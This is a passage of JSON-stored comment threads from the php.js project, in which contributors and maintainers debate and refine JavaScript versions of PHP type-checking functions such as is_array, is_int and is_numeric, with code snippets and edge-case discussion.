one).\r\n\r\nI think that's entirely reasonable to avoid the configuration, though I think it could be interesting to integrate it into a separate framework. Heck, maybe I might try something with it later on because I do think it could be very useful."},{"date":"2008-12-30 20:20:20","author":"Onno Marsman","url":"","comment":"Ok, than we'll just leave it to return true on objects.\r\n\r\n\r\nI do have a tiny little problem (I just can't help myself, sorry) with the comments: &quot;Uncomment to disable support&quot; It's not that it's not supported if you do that, it just behaves differently with all the pros en cons we discussed. If you do feel that it would be disabling support for ..., it wouldn't make any sense to put it there: who would want to disable support for something?"},{"date":"2008-12-31 10:56:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: You are totally right. How about the current comment.\r\n\r\n@ Brett Zamir: I didn't even know that, I'm amazed actually. Google's got some work to do on improving her engine :)\r\n\r\nAbout the frameworks: Besides the obvious naming conflicts, the main reason I created the namespaced version was for others to be able to more easily extend & build on top of it. "},{"date":"2009-01-14 14:59:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman &amp; Brett Zamir: \r\n\r\nWhat if we traverse the variable and verify that hasOwnProperty returns true for every element, and only then return true for is_array? \r\n\r\nThat way you can be pretty sure that this object is just a storage container, and nothing fancy otherwise."},{"date":"2009-01-14 16:23:56","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Kevin and Onno,\r\n\r\nMy feeling is that it's a toss-up. It doesn't bother me though because I really feel that after implementing more of the functions, it will be good to make a customizable version (on my own if you're not interested), since different people may want to handle things differently. \r\n\r\nIt's not like people can't study a little bit to set up something as potentially useful as this (and they should know what the code is doing before relying on it). A few main global configuration options (though ideally over-rideable on a function-by-function or function-group basis) like \r\n\r\n1) When if at all to treat objects as associative arrays\r\n\r\n2) Whether to follow PHP strictly or enable some useful customizations (not too many, but a few \r\nthat are just too natural\/useful to pass up); basically the things in the functions which told people that they could uncomment the given lines (or the ones we wanted to add but felt would deviate too much from PHP--e.g., a file_get_contents() that could be configured to work with asynchronous Ajax, with Firefox (or possibly Explorer) local file access code, etc.)"},{"date":"2009-01-15 11:15:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: It would be cool to see other implementations coming to live. As long as I can focus on a simple robust base, people will have something consistent to build their spinoffs on.\r\n\r\nSo like I said: Personally I would like to focus on the main php.js library. Still a lot of work to be done there. \r\n\r\nBut I encourage anyone who takes that and puts it to other use. Even you :)"},{"date":"2009-01-20 18:56:28","author":"Onno Marsman","url":"","comment":"Hadn't looked at this 'thread' for a while and I see there's still a question from Brett more or less open for me, about the hasOwnProperty solution and the answer to that is pretty much the same as my feelings for the whole framework\/configuration idea: \r\n\r\nI only use phpjs for the functions that are missing from javascript, and I also use it to promote javascript for other php-developers in my team because they can easily see in this library how some things can be done in javascript. About everything beyond that: I really don't care what happens: as long as I have simple functions that I can copy\/paste and there aren't a lot of dependencies (which includes configuration for these functions I guess). The functions I'm talking about don't include is_array or exit or stuff like that, but I guess I've been clear on that."},{"date":"2009-01-24 23:10:35","author":"Luke","url":"http:\/\/lucassmith.name","comment":"While I entirely disagree with the philosophy of obfuscating a purposeful distinction in object types vis Array vs Object in the language you are entreating your consumers to write in, it has recently become best practice in js to check for Array type using this technique:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction isArray(a) {\r\n    return Object.prototype.toString.call(a) === '[object Array]';\r\n}\r\n[\/CODE]\r\n\r\nSee this article for reference:\r\nhttp:\/\/thinkweb2.com\/projects\/prototype\/instanceof-considered-harmful-or-how-to-write-a-robust-isarray\/"},{"date":"2009-01-25 08:51:56","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Luke,\r\nClever idea--I like it. Of course it's not foolproof if somebody overrides the Object prototype's toString() (e.g., to list all of its properties). I think an even more robust solution (and one unlikely to fail in an environment which played with built-in prototypes) might simply be to build on Crockford's approach and test for further methods (e.g., 'concat' is a pretty unlikely property) and\/or to insist the method is on the prototype (excluding a user from having the property as a direct property). For example, the test, ('concat' in obj.constructor.prototype ), would catch arrays but not even {concat:'something'}. Someone could still do &quot;delete Array.prototype.splice&quot; but I think that would be much less likely than overriding Object.prototype.toString() which has some potential uses."},{"date":"2009-01-25 14:32:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Luke: Thanks for the heads-up. Interesting article. But for the record: it's not exactly our philosophy to obfuscate object types. I don't even think there is a WE in this matter.\r\n\r\nBut my view is: that if you're 'inside' php.js, you have a PHP mindset and expect associative arrays to be, well, just arrays.\r\n\r\nYou'd probably want this to just execute:\r\n[CODE=&quot;Javascript&quot;]\r\nvar keys = array('0', '1', '2');\r\nvar vals = array('a', 'b', 'c');\r\n \r\ncombined = array_combine(keys, vals);\r\nif (is_array(combined)) { \/\/ WILL FAIL IF WE DENY OBJECTS!\r\n    print_r(combined);\r\n}\r\n[\/CODE]\r\n\r\n.. but it clearly doesn't if we don't allow objects to be arrays as well.. And so we've been struggling with imperfection since.\r\n\r\nLuckily, if you need the JavaScript-point-of-view of a variable, you can also just use JavaScript code to establish that. If you want the php point-of-view, use php.js functions."},{"date":"2009-01-26 04:54:55","author":"Luke","url":"http:\/\/lucassmith.name","comment":"@Brett,  FYI, Doug uses the Object.proto.toString method now.\r\n\r\nhttp:\/\/blog.360.yahoo.com\/blog-TBPekxc1dLNy5DOloPfzVvFIVOWMB0li?p=916"},{"date":"2009-01-27 05:19:55","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Luke,\r\n\r\nYes, thanks for pointing it out. But also note &quot;Martin B.&quot; makes the same observation I did per the &quot;Miller device&quot; on the blog you cite. There's apparently really no foolproof\/secure way to conclusively determine something is an array (and only an array) in JS."},{"date":"2009-02-10 08:17:55","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's my stab at isArray() (I'm not using the PHP format since this doesn't return true for objects\/associative arrays) in case any were interested.\r\n\r\nfunction isArray (arr) {\r\n    if (arr instanceof Array || \/\/ catch most common occurrence and exist quickly if so\r\n\t    (\r\n\t\t'splice' in arr.constructor.prototype &amp;&amp;\r\n\t\t'concat' in arr.constructor.prototype &amp;&amp; \/\/ not a word, so may be safer than splice, but can't replace it since concat present on string object\r\n\t\t!(arr.propertyIsEnumerable('length')) &amp;&amp;\r\n\t\ttypeof arr.length === 'number'\r\n\t    )\r\n\t) {\r\n\treturn true;\r\n    }\r\n    return false;\r\n}"},{"date":"2009-03-06 16:21:20","author":"mk.keck","url":"","comment":"Improved function is_array():\r\nWhy not let the user change dynamicly the behavior of is_array()?\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction is_array() {\r\n    var a = arguments;\r\n    if (a.length &lt; 1) {\r\n        return false;\r\n    }\r\n\/\/ Check Value\r\n    var v = a[0];\r\n\/\/ Check Strict\r\n    var s = ( (typeof(a[1]) !== 'undefined' &amp;&amp; a[1]) ? 1 : 0 );\r\n    if (typeof(v) === 'object') {\r\n        if (v.hasOwnProperty) {\r\n            for (var k in v) {\r\n\/\/ Checks whether the object has the specified\r\n\/\/ property if not, we figure it's not an object\r\n\/\/ in the sense of a php-associative-array.\r\n                if (false === v.hasOwnProperty(k)) {\r\n                    return false;\r\n                }\r\n            }\r\n        }\r\n\/\/ If (s &gt; 0) then strict JavsScript-proof type checking\r\n\/\/ is enabled. This will not support PHP associative\r\n\/\/ arrays (JavaScript objects), however.\r\n\/\/ Read discussion at:\r\n\/\/ http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_is_array\/\r\n        if (s &gt; 0) {\r\n            if (v.propertyIsEnumerable('length') || typeof(v.length) !== 'number') {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n[\/CODE]"},{"date":"2009-04-28 09:00:02","author":"KELAN","url":"","comment":"[CODE]\r\nfunction is_array(mixed_var){\r\n\tif (mixed_var) return Object.prototype.toString.apply(mixed_var)==='[object Array]';\r\n\telse return false;\r\n}\r\n[\/CODE]"},{"date":"2009-04-29 15:27:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ KELAN: Thanks for contributing. I would like to make the same point as here:\nhttp:\/\/phpjs.org\/functions\/view\/422#comment_33054 though"},{"date":"2009-04-30 04:20:35","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@KELAN, in the same line as Kevin's question, see also the discussion I had earlier with Luke here. I think my own proposed check for both splice and concat, etc. should be pretty safe, though feedback is welcome.\n\n@Mk. Keck, sorry for the late reply. Rather than overload the arguments to the functions (to which PHP itself might add additional arguments in the future which could conflict with any we add), the approach we are taking for customizability is the same as for PHP: use ini, and to distinguish our own specific ini-setting needs, we can use \"phpjs.\" as a prefix (as though phpjs were an extension to PHP).\n\nSo, we can modify things to work like this:\n\nini_set('phpjs.objectsAsArrays', false);\n\nis_array({prop:'val'}); \/\/ false\n\n(If you were curious about the technical details, this can work since is_array() will check for the global this.php_js.ini['phpjs.objectsAsArrays'].local_value set by ini_set() and act accordingly, or default to true if none had been set; 'this' will refer to the global window unless the namespaced version is used, in which case this.php_js will be an instance variable, rather than a global. (\"php_js\" is reserved as the single global we require in some functions in the non-namespaced version.)\n\nHow does that sound?"},{"date":"2009-04-30 04:55:24","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"You know, unless I'm just getting dizzy from this topic, I think I may have found (or refound?) a foolproof way to establish that something is an array, and only an array (i.e., for strict checking mode).\n\ntypeof a === 'object' && a.hasOwnProperty('length') && !a.propertyIsEnumerable('length')\n\nThe first test excludes strings, the 2nd test excludes objects with a length property added further up the prototype chain, while the 3rd test excludes objects with a length property added directly on an instance, all while catching arrays. Am I missing something? I don't think there are any other built-in types with a length property...\n\nBrett"},{"date":"2009-04-30 05:05:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Looks like we need one more check:\n\n && a.constructor !== String\n\nsince the rare \n\nvar str = new String();\n\nform would otherwise qualify.\n\nActually if the same frame problem with Array occurs (presumably due to Array constructor being of a different identity), I've wondered why:\n\n!a.constructor || a.constructor.name !== 'Array'\n\nor in our case here:\n\n!a.constructor || a.constructor.name !== 'String'\n\ncouldn't do the trick regardless of frames...\n\nIf this wouldn't work, we could use the same trick to check for methods that are only built-in on String (as opposed to Array).\n\nBrett"},{"date":"2009-05-10 12:23:20","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"FYI, I've just added the ability (function in SVN) for you to set the ini (e.g., ini_set('phpjs.objectsAsArrays', 0);) to establish strict type checking for arrays (not any kind of object). However, the default behavior still treats objects as arrays (unless they are objects which inherit properties)."},{"date":"2009-05-11 17:38:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Great work Brett, I Gotta say!"},{"date":"2009-05-12 02:43:39","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, I neglected to add the \"phpjs.\" prefix in a few cases. Fixed now in SVN."},{"date":"2010-05-10 19:01:16","author":"Mathias Bynens","url":"http:\/\/mathiasbynens.be\/","comment":"Wow, WTF!\n\nWhat\u2019s wrong with:\n\n[CODE]function isArray(obj) {\n return '[object Array]' === Object.prototype.toString.call(obj);\n};[\/CODE]"},{"date":"2010-05-11 06:35:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Mathias Bynens: php.js, in order to support use of object literals as associative arrays (to the extent possible), considers these as \"arrays\" (while attempting to exclude objects which have inherited properties and thus less likely to have been intended as an associative array). We also allow configuration for people who do not want to treat objects as arrays."},{"date":"2010-11-21 22:25:05","author":"Nathan","url":"","comment":"I agree with Andrey, I cannot find a single instance where:\n\n[CODE]\nfunction is_array(mixed_var)\n{\n\n}\n[\/CODE]"},{"date":"2010-11-21 22:27:06","author":"Nathan","url":"","comment":"I agree with Andrey, I cannot find a single instance where:\n[CODE]\nfunction is_array(mixed_var)\n{\n    return mixed_var instanceof Array;\n}\n[\/CODE]\n\ndoes not work."},{"date":"2010-11-22 07:41:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Nathan: Although I can't see Andrey's comment here, what you cite is not supposed to work across frames because \"Array\" will be a different constructor on another frame: http:\/\/perfectionkills.com\/instanceof-considered-harmful-or-how-to-write-a-robust-isarray\/ (also if someone defined their own Array: \"var Array = function () {}\"). Also, in our case, we may treat objects as arrays, since we allow them potentially as associative arrays."},{"date":"2010-11-22 21:20:20","author":"Nathan","url":"","comment":"@Zamir: I can see how instanceof would have have issues with a user defining their own Array object. As for frames, they just shouldn't be used, but, seeing as they are, and that they are available, one must program for them. As for associative arrays, according the function above, are we assuming that all literal objects (meaning \"var myObj = {};\") are considered assoc arrays, and that all non-literal objects (such as functions and javascript psuedo-classes (via the prototype) are to be then considered objects? The only exception here of course being the Array class. This makes sense to me, I just have never programmed for assoc arrays in javascript because I really just have never had the time, and now that I do, here I  am."},{"date":"2010-11-24 12:57:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Nathan: Pretty much, yes (by default). But this should probably be checking the constructor property instead to see whether it is a regular function or the built-in object constructor, since the current approach would allow some non-inheriting objects created with \"new\" to be considered as associative arrays (though maybe some would like it that way). \n\nAnother issue with associative arrays is ECMAScript's annoyingly unpredictable iteration order, so I'm hoping we can allow array() to allows objects to be built something like this, with multiple objects passed as arguments to preserve order:  var arr = array({key1:'val1'}, {key2:'val2'});.\n\nYet another related issue is how IE doesn't really delete properties, as it remembers their iteration sequence, making it impossible for us to sort arrays in place (thus requiring us to deviate from PHP and return a copy of the array). The proposal I mentioned would deal with this problem too, albeit in a regrettably but necessarily ugly way."},{"date":"2010-11-24 19:26:09","author":"Nathan","url":"","comment":"@Brett: I posted some code earlier and it hasn't shown up, I used the constructor and was able to shorten the above function to only a few lines:\n[CODE]\nif(Object.prototype.toString.call(mixed_var) === \"[object Array]\")\n        {\n            return true;\n        }\n        else if(Object.prototype.toString.call(mixed_var) === \"[object Object]\")\n        {\n            if(getFuncName(mixed_var.constructor) === \"Object\")\n            {\n                return true;\n            }\n        }\n        \n        return false;\n[\/CODE]\n(of course, I need to add the getFuncName function, but you already have it)"},{"date":"2010-11-24 19:30:49","author":"Nathan","url":"","comment":"REVISION:\n[CODE]\nfunction is_array (mixed_var)\n{\n    var getFuncName = function (fn) {\n        var name = (\/\\W*function\\s+([\\w\\$]+)\\s*\\(\/).exec(fn);\n        if (!name) {\n            return '(Anonymous)';\n        }        return name[1];\n    };\n \n    if (!mixed_var) {\n        return false;\n    }\n\n    if(Object.prototype.toString.call(mixed_var) === \"[object Array]\")\n    {\n        return true;\n    }\n    else if(Object.prototype.toString.call(mixed_var) === \"[object Object]\" && this.getFuncName(mixed_var.constructor) === \"Object\")\n    {\n        return true;\n    }\n    \n    return false;\n}\n[\/CODE]"},{"date":"2010-11-24 19:35:51","author":"Nathan","url":"","comment":"Sorry for the reposts, feel free to remove the other one below, I didn't know the code would be hidden, and I forgot to remove a this:\n[CODE]\nfunction is_array (mixed_var)\n{\n    var getFuncName = function (fn) {\n        var name = (\/\\W*function\\s+([\\w\\$]+)\\s*\\(\/).exec(fn);\n        if (!name) {\n            return '(Anonymous)';\n        }        return name[1];\n    };\n \n    if (!mixed_var) {\n        return false;\n    }\n\n    if(Object.prototype.toString.call(mixed_var) === \"[object Array]\")\n    {\n        return true;\n    }\n    else if(Object.prototype.toString.call(mixed_var) === \"[object Object]\" && \n                    getFuncName(mixed_var.constructor) === \"Object\")\n    {\n        return true;\n    }\n    \n    return false;\n}\n[\/CODE]"},{"date":"2010-11-30 16:09:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Nathan: I adapted your code a bit and added to Git, thanks for the patches. We still want to keep the INI settings so that people can force this function to disallow objects from being considered as arrays. I also kept part of the old way in the comments because the old way was also valid and even harder to get a false result, but I agree your solution is simpler."},{"date":"2011-01-02 09:27:05","author":"abdelrahman salem","url":"http:\/\/jo.linkedin.com\/in\/abdsalem","comment":"[CODE]\n\nfunction is_array(inputArray) {   \t\n    return inputArray && !(inputArray.propertyIsEnumerable('length')) && typeof inputArray === 'object' && typeof inputArray.length === 'number';\n}\n\n[\/CODE]"},{"date":"2011-01-02 10:49:15","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@abdelrahman salem: That's a good one, unless you pass in a string constructed by a String constructor:\n\n[CODE]is_array(new String('abc')); \/\/ true[\/CODE]\n\n(or if you override propertyIsEnumerable)\n\nThere seem to be no 100% perfect solutions for this one..."},{"date":"2011-03-14 23:16:22","author":"Nathan Sepulveda","url":"","comment":"I was wondering if you could put my last name on the credits for this function, I only say this because the name \"Nathan\" links to two different contributions, but I have only contributed on this function, and not to the htmlspecialchars function and I would like to make that distinction. Thanks."},{"date":"2011-03-15 04:09:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Nathan (Sepulveda): Fixed in Git. Thanks!"},{"date":"2011-03-16 19:28:09","author":"Nathan Sepulveda","url":"","comment":"@Brett: Thanks!"},{"date":"2011-07-02 00:39:50","author":"Lcf.vs","url":"lcfvs.monespace.net\/perso","comment":"Why complicate?\n\n[CODE]\nfunction isArray(supposedArray){\n\treturn supposedArray instanceof Array;\n}\n[\/CODE]"},{"date":"2011-07-02 11:29:50","author":"Me","url":"","comment":"@Lcf.vs: You can find an answer to your question here http:\/\/phpjs.org\/functions\/is_array:437#comment_112008"},{"date":"2011-07-02 12:34:09","author":"Lcf.vs","url":"lcfvs.monespace.net\/perso","comment":"Me>\n[CODE]\nvar test;\ntest=[]; \/\/ true\ntest=[[]]; \/\/ true\ntest=[new Array()]; \/\/ true\ntest=new Array(); \/\/ true\ntest=new Array([]); \/\/ true\ntest=new Array(new Array()); \/\/ true\ntest[1]=3; \/\/ true\ntest={}; \/\/false\ntest[0]=1; \/\/false\n[\/CODE]\n\nWhat else?"}],"is_bool":[{"date":"2012-04-30 08:09:49","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nFor is_bool, i use:\n[code]\nfunction is_bool(obj) {\n  return (obj === true || obj === false);\n}\n[\/code]"},{"date":"2012-07-04 17:09:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@CoursesWeb: I've applied your optimization to Git (faster on FF). Thanks!"}],"is_callable":[{"date":"2012-03-24 16:38:57","author":null,"url":"","comment":"Thanks to developpers.\n\nMay you have to bring is_callable friendly with javascript closures : \nhttp:\/\/fr2.php.net\/manual\/fr\/function.is-callable.php#98845"},{"date":"2012-06-16 08:14:51","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Fran\u00e7ois: I've now added support for function types. Thanks!"}],"is_float":[{"date":"2009-12-13 09:24:02","author":"WebDevHobo","url":"http:\/\/webdevhobo.blogspot.com","comment":"Nevermind my comments, I just now noticed in the docs the text about the 1.0 issue. :P"},{"date":"2011-03-23 11:13:04","author":"Enrique Melendez","url":"http:\/\/www.ita.es","comment":"version in one line:\n[CODE]\nreturn typeof mixed_var == 'number' ? !!(mixed_var % 1) : false;\n[\/CODE]"},{"date":"2012-04-30 08:40:35","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nFor is_float i use this version:\n[code]\nfunction is_float(n) {\n  return n===+n && n!==(n|0);\n}\n[\/code]\n - is_float() doesn't always work if you are validating form input. This is because form inputs are strings, even if the user typed a number."}],"is_int":[{"date":"2008-11-28 23:19:12","author":"Paulo Ricardo F. Santos","url":"","comment":"KISS way: just do value\/type comparison with parseInt() result. :)\r\n\r\n[CODE=&quot;javascript&quot;]function is_int(mixed_var)\r\n{\r\n    return mixed_var === parseInt(mixed_var * 1);\r\n}[\/CODE]"},{"date":"2008-11-29 01:38:03","author":"Paulo Ricardo F. Santos","url":"","comment":"Note: both current\/my implementation isn't PHP compliant at all, since in JS '1.0 === 1' is a True comparison."},{"date":"2008-12-01 09:29:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: thanks. I believe that 1.0 is simplified to 1 as soon before it can be accessed by the function. if I echo mixed_var in the function's first statement, it's already 1. So if anybody knows a good way to get this example working:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ *     example 3: is_int(1.0);\r\n    \/\/ *     returns 3: false\r\n[\/CODE]\r\n\r\nplease let me know!"},{"date":"2008-12-03 12:47:44","author":"Paulo Ricardo F. Santos","url":"","comment":"@ Kevin: Yep, the value is evaluated before it is assigned - this should occurs through the Number object constructor. A time that JS lacks different objects to Float\/Integer values, I think that, unfortunately,  there's no way to match this approach. ;\/"},{"date":"2008-12-03 13:13:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: OK, I've added a note to the is_int code, we'll leave it at that then."},{"date":"2009-01-20 15:15:26","author":"Matt Bradley","url":"http:\/\/www.inventpartners","comment":"This version will also work with strings\r\n\r\nfunction is_int(value){\r\n  if(parseFloat(value) == parseInt(value)){\r\n      return true;\r\n  } else {\r\n      return false;\r\n  } \r\n}"},{"date":"2009-01-25 14:13:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Matt Bradley: Thanks for you function. The current implementation did as well. But in fact, I checked the PHP manual: and that's not supposed to happen. So I've actually changed your implementation that also the type is looked at. And now all the examples in the php manual workout with our function as well."},{"date":"2009-09-08 13:09:10","author":"Jordan","url":"","comment":"[CODE]\nis_int('23,5') return true...\n[\/CODE]\n"},{"date":"2009-09-08 14:17:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jordan: It's false for me (as it should be)--not sure what you mean..."},{"date":"2009-10-30 02:50:16","author":"WebDevHobo","url":"http:\/\/webdevhobo.blogspot.com","comment":"Interesting implementation. I'm not that big with Javascript, so this is real nice.\n\nHere's 2 functions that I usually use for this kind of stuff:\n\n[code]function isInteger(value){\n  return (!(value % 1));\n}\n\nfunction isNumber(n){\n  return n != null && n != \"\" && typeof(n) != \"boolean\" && !isNaN(n);\n}[\/code]\n\nDon't know what flaws might be in them, but they sure did the trick uptill now."},{"date":"2009-11-07 13:25:46","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@WebDevHobo: Thanks for pointing out those useful functions. We needed the extra checks in our is_numeric(), though I realized later (see http:\/\/github.com\/kvz\/phpjs\/commit\/eb83b48c940e4f8c5548d63c178c2fae2c0ba729 ) that we also needed to prevent arrays being treated as numeric. As far as integer checking, while we still needed our check for type (e.g., your isInteger() will return true for true), the use of modulus is I believe a sound replacement for the more complex comparison we had earlier. Fixed at http:\/\/github.com\/kvz\/phpjs\/commit\/06388a893c7a5bcb1876ada68997c04241fc6d52 . Thanks for the functions!"},{"date":"2009-12-13 01:09:14","author":"WebDevHobo","url":"http:\/\/webdevhobo.blogspot.com","comment":"[code]is_int(0.0)[\/code] returns true\n\nScreenshot: http:\/\/i.imgur.com\/rvtAc.png\nAny number of 0's may be added after the . sign, result stays true. The moment you add any other number somewhere behind the . sign, result becomes false.\n\nSupposed bugfix: Check for the . sign and return false whenever encountered. Not sure how to do that, which is why I didn't code it myself.\n\nThat is, if we [b]want[\/b] this to return false? 0.0 is the exact same as 0, far as I know.\n\nAlso: \"On line: #25: Confusing use of '!'.\"\n\nFar as I know, what happens here is the \"order of execution\". The parser will first execute that within the () and then the ! will be applied to the result, which is what is needed. Not very confusing."},{"date":"2009-12-13 01:12:01","author":"WebDevHobo","url":"http:\/\/webdevhobo.blogspot.com","comment":"Also, the link to the PHP is_int function(to the official PHP docs) is broken. Apparently, not an underscore, but a minus sign is used in the link.\n\nMy guess: they want to reserve underscores for replacing spaces."},{"date":"2009-12-13 09:24:43","author":"WebDevHobo","url":"http:\/\/webdevhobo.blogspot.com","comment":"Nevermind my comment on the 0.0 issue, I should read the documentation before saying stuff."},{"date":"2009-12-14 15:54:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ WebDevHobo: Thanks I fixed the link to the php docs throughout the site. As for is_int: yeah that's a real bummer. We can get close to PHP but sometimes it just isn't possible to nail it.\nDid fix the jslint warning though, will disappear soon ; )"},{"date":"2011-03-23 11:07:30","author":"Enrique Melendez","url":"http:\/\/www.ita.es","comment":"version in one line:\n[CODE]\nreturn typeof mixed_var !== 'number' ? false : !(mixed_var % 1);\n[\/CODE]"},{"date":"2011-03-23 14:55:02","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"even shorter\n\n[code]return mixed_var === (mixed_var | 0);[\/code]"},{"date":"2012-04-30 08:20:25","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nFor is_int i use this version:\n[code]\nfunction is_int(n) {\n  return typeof(n)===\"number\" && Math.round(n) == n;\n}\n[\/code]"},{"date":"2012-07-04 17:02:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@CoursesWeb: Is there some case where your code catches something ours does not?"}],"is_nan":[{"date":"2008-10-10 12:05:58","author":"Robin","url":"","comment":"... I'm sorry but this is laughable.\r\n\r\nisNaN duplicates this functionality. Just write a wrapper.\r\n\r\nIf you're really bothered, a simple regexp could also do the trick just as easily. This is just getting on the edge of silly now."},{"date":"2008-10-10 15:05:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Robin: I agree that this may look a bit elaborate, but if I remember correctly, Onno Marsman had some very good reasons for implementing it this way. I'll ask him to comment you on the specifics."},{"date":"2008-10-10 15:45:46","author":"Onno Marsman","url":"","comment":"Never really thought of using a regular expression to test whether a string would result in an error and you're right: that would probably be a lot better. Feel free to post your suggestion, otherwise I'll have a look at it myself tomorrow.\r\n\r\nFurthermore: is_nan in PHP behaves very differently from isNaN in javascript. Javascripts isNaN is more like the opposite of PHPs is_numeric function (Just have a look at the implementation of is_numeric in this library). So a simple wrapper to isNaN won't suffice and the extra check for the number type is needed.\r\n\r\nThe rest of the code in this function is just to generate errors in the same way PHP does. And the suggested regular expression will, of course, make this code a lot shorter.\r\n\r\nNote that is_finite and is_infinite both contain the exact same error code. I will fix this too."},{"date":"2008-10-28 18:13:54","author":"Robin","url":"","comment":"I'm sorry I was a douche :("}],"is_numeric":[{"date":"2008-01-16 20:08:49","author":"David","url":"","comment":"The is_numeric function is not correct, at least it doesn't work like PHP.  A numeric string, like &quot;-876.20&quot; should return true, but it doesn't because it doesn't pass the [typeof mixed_var == 'number'] condition."},{"date":"2008-01-16 20:10:36","author":"David","url":"","comment":"One of your tests should be:\r\n\r\nis_numeric(&quot;+186.31e2&quot;);\r\n\r\nAnd that needs to return true."},{"date":"2008-01-16 22:17:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ David: Thank you for noticing. I thouhgt of isNaN(), which I think does the trick. If you wan't to be credited differently let me know."},{"date":"2008-03-01 13:56:57","author":"Martijn Wieringa","url":"","comment":"I've been working on a simular project.. Here are some functions i completes so far.\r\n\r\n[code=&quot;javascript&quot;]\r\n\r\n\/\/ Load PHP library\r\nvar PHP = new PHP_LIBRARY();\r\n\r\n\/\/ Call some function within PHP library\r\nPHP.func(params);\r\n\r\n[\/code]\r\n\r\nHere's my library (so far)\r\n\r\n[code=&quot;javascript&quot;]\r\n\r\nvar PHP_LIBRARY = function() {}\r\n\r\nPHP_LIBRARY.prototype = \r\n{\r\n\t'abs' : function(f_float)\r\n\t{\r\n\t\treturn isNaN(f_float) ? 0 : Math.abs(f_float);\r\n\t},\r\n\r\n\t'chr' : function(f_ascii)\r\n\t{\r\n\t\treturn String.fromCharCode(f_ascii);\r\n\t},\r\n\r\n\t'explode' : function(f_seperator, f_string)\r\n\t{\r\n\t\treturn f_string.split(f_seperator);\r\n\t},\r\n\r\n\t'implode' : function(f_glue, f_array)\r\n\t{\r\n\t\treturn f_array.join(f_glue);\r\n\t},\r\n\r\n\t'join' : function(f_glue, f_array)\r\n\t{\r\n\t\treturn this.implode(f_glue, f_array);\r\n\t},\r\n\r\n\t'number_format' : function(f_float, f_decimals, f_decimal_sign, f_thousand_sign)\r\n\t{\r\n\t\tif(f_decimals == undefined)\r\n\t\t{\r\n\t\t\tf_decimals = 0;\r\n\t\t}\r\n\r\n\t\tif(f_decimal_sign == undefined)\r\n\t\t{\r\n\t\t\tf_decimal_sign = '';\r\n\t\t}\r\n\r\n\t\tif(f_thousand_sign == undefined)\r\n\t\t{\r\n\t\t\tf_thousand_sign = '';\r\n\t\t}\r\n\r\n\t\tvar result = this.implode(f_thousand_sign, this.str_split(Math.floor(f_float).toString(), 3, true));\r\n\r\n\t\tif(f_decimals &gt; 0)\r\n\t\t{\r\n\t\t\tvar d = Math.round((f_float % 1) * Math.pow(10, f_decimals)).toString();\r\n\t\t\tresult += f_decimal_sign + d + this.str_repeat('0', f_decimals - d.length);\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\t'ord' : function(f_string)\r\n\t{\r\n\t\treturn f_string.charCodeAt(0);\r\n\t},\r\n\r\n\t'split' : function(f_seperator, f_string)\r\n\t{\r\n\t\treturn this.explode(f_seperator, f_string);\r\n\t},\r\n\r\n\t'str_repeat' : function(f_string, f_repeat)\r\n\t{\r\n\t\tvar result = '';\r\n\r\n\t\twhile(f_repeat &gt; 0)\r\n\t\t{\r\n\t\t\tresult += f_string;\r\n\t\t\tf_repeat--;\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\t'str_replace' : function(f_needle, f_replace, f_haystack)\r\n\t{\r\n\t\tvar result = '';\r\n\t\tvar index = 0;\r\n\r\n\t\twhile((index = f_haystack.indexOf(f_needle)) &gt; -1)\r\n\t\t{\r\n\t\t\tresult += 